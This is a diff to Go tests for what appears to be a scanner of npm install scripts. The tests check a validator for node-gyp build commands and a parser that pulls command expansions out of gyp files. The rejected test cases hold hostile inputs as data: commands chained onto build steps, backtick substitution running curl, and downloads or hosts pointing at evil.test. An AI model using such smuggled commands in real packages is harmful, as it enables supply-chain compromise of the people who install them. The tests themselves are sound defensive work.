@@ -40,21 +40,29 @@ func TestInstallScriptMasksSecrets(t *testing.T) {
 
 func TestNodeGypAndPrepareGuards(t *testing.T) {
 	for script, want := range map[string]bool{
-		"node-gyp rebuild":                         true,
-		"prebuild-install || node-gyp rebuild":     true,
-		"node-pre-gyp install --fallback-to-build": true,
-		"cmake-js compile -O build --release":      true,
-		"node-gyp rebuild && node evil.js":         false,
-		"node-gyp rebuild $(node evil.js)":         false,
-		"node-gyp rebuild `curl -s http://x/y`":    false,
-		"node-gyp rebuild\nnode evil.js":           false,
-		"node-gyp rebuild\r\nnode evil.js":         false,
-		"node-gyp rebuild > /tmp/x":                false,
-		"node-gyp rebuild ${EVIL}":                 false,
-		"node-gyp rebuild node evil.js":            false,
-		"node-gyp rebuild --x 'a;b'":               false,
-		"node-gyp-build & node evil.js":            false,
-		"":                                         false,
+		"node-gyp rebuild":                                                        true,
+		"prebuild-install || node-gyp rebuild":                                    true,
+		"node-pre-gyp install --fallback-to-build":                                true,
+		"cmake-js compile -O build --release":                                     true,
+		"node-gyp rebuild && node evil.js":                                        false,
+		"node-gyp rebuild $(node evil.js)":                                        false,
+		"node-gyp rebuild `curl -s http://x/y`":                                   false,
+		"node-gyp rebuild\nnode evil.js":                                          false,
+		"node-gyp rebuild\r\nnode evil.js":                                        false,
+		"node-gyp rebuild > /tmp/x":                                               false,
+		"node-gyp rebuild ${EVIL}":                                                false,
+		"node-gyp rebuild node evil.js":                                           false,
+		"node-gyp rebuild --x 'a;b'":                                              false,
+		"node-gyp-build & node evil.js":                                           false,
+		"prebuild-install --download https://evil.test/a.tgz || node-gyp rebuild": false,
+		"prebuild-install -d https://evil.test/a.tgz":                             false,
+		"prebuild-install --download=evil.test/a.tgz":                             false,
+		"node-gyp rebuild --directory=node_modules/.cache/x":                      false,
+		"node-gyp rebuild -C other":                                               false,
+		"node-gyp rebuild --dist-url=https://evil.test/node":                      false,
+		"node-pre-gyp install --fallback-to-build --host=evil.test":               false,
+		"prebuild-install --runtime napi || node-gyp rebuild --release":           true,
+		"": false,
 	} {
 		if got := nodeGyp(script); got != want {
 			t.Errorf("nodeGyp(%q) = %v", script, got)
@@ -203,4 +211,29 @@ func TestAutoloadLowOnlyForDefinitions(t *testing.T) {
 	if f := only(t, run(t, installDetector{}, s), SigAutoloadFiles); f.Severity != cli.SeverityMedium {
 		t.Errorf("an unanalysed file is %s, want medium", f.Severity)
 	}
+}
+
+func TestGypCommands(t *testing.T) {
+	text := "{'cflags': ['<!(node -p require(1))'], 'libs': ['<!@(pkg-config --libs (x))'],\n 'x': '<!open\n'}"
+	got := gypCommands(text)
+	want := []string{"<!(node -p require(1))", "<!@(pkg-config --libs (x))", "<!open"}
+	if strings.Join(got, "|") != strings.Join(want, "|") {
+		t.Errorf("gypCommands = %q, want %q", got, want)
+	}
+	if gypCommands("{'sources': ['a.cc']}") != nil {
+		t.Error("a gyp file without expansions has commands")
+	}
+}
+
+func FuzzGypCommands(f *testing.F) {
+	for _, s := range []string{"", "<!", "<!(", "<!)", "<!(a(b)c)", "<!@(x)\n<!(y", "a <! b"} {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, s string) {
+		for _, c := range gypCommands(s) {
+			if !strings.HasPrefix(c, "<!") {
+				t.Fatalf("command %q does not start with <!", c)
+			}
+		}
+	})
 }
